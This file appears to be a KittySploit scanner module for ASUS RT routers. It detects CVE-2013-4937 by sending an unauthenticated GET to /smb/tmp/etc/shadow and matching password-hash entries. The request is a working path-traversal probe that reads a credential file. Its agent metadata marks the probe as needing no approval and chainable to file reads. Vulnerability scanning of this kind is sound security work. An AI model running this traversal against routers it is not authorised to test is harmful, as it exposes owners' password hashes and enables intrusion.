#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ASUS RT AICloud smb path traversal (CVE-2013-4937)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ASUS RT - AICloud smb Traversal Detection (CVE-2013-4937)',
        'description': (
            'Detects CVE-2013-4937 by requesting /smb/tmp/etc/shadow and matching '
            'passwd-style entries.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2013', 'asus', 'router', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2013-4937',
        ],
        'cve': 'CVE-2013-4937',
    }

    def run(self):
        r = self.http_request(method='GET', path='/smb/tmp/etc/shadow', allow_redirects=False)
        if r and re.search(r'(nas|admin|nobody):.*:0:[01]:', r.text or ''):
            self.set_info(
                severity='high',
                reason='ASUS AICloud smb traversal (CVE-2013-4937)',
                path='/smb/tmp/etc/shadow',
            )
            return True
        return False
